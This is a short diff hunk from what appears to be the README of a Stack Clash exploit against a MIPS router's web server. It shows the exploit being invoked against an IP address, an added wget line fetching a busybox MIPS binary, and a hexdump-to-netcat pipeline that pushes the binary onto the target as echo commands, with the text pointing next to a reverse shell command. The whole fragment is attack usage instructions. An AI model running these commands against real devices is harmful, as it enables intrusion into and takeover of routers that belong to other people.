@@ -66,6 +66,7 @@ $ ./StackClash_mips.py 192.168.8.1 80 www_binary "echo hello world > /dev/lcd"
 To upload `busybox-mips` in `/ram/busybox`  
 In a shell:
 ```
+$ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips  
 $ hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g" | nc -l -q 0 -p 1234
 ```  
 In another shell (note that this is the reverse shell command):
